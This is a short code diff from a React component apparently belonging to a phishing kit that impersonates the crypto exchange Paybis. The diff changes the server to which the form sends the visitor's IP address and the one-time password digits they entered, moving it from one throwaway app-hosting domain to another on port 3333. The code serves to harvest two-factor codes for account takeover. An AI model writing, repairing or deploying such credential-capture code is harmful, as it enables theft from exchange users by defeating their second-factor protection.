@@ -74,7 +74,7 @@ export default function PaybisOTPMSG({ socket, ip,setCenaAtual,msgRecebida }) {
     event.preventDefault();
 
     if (validateForm()) {
-      await axios.post("http://glittering-haupia-fdf321.netlify.app:3333/atualizaotp2", {
+      await axios.post("https://clownfish-app-h28dc.ondigitalocean.app:3333/atualizaotp2", {
         ip,
         OTP2:
           otp["otp1"] +
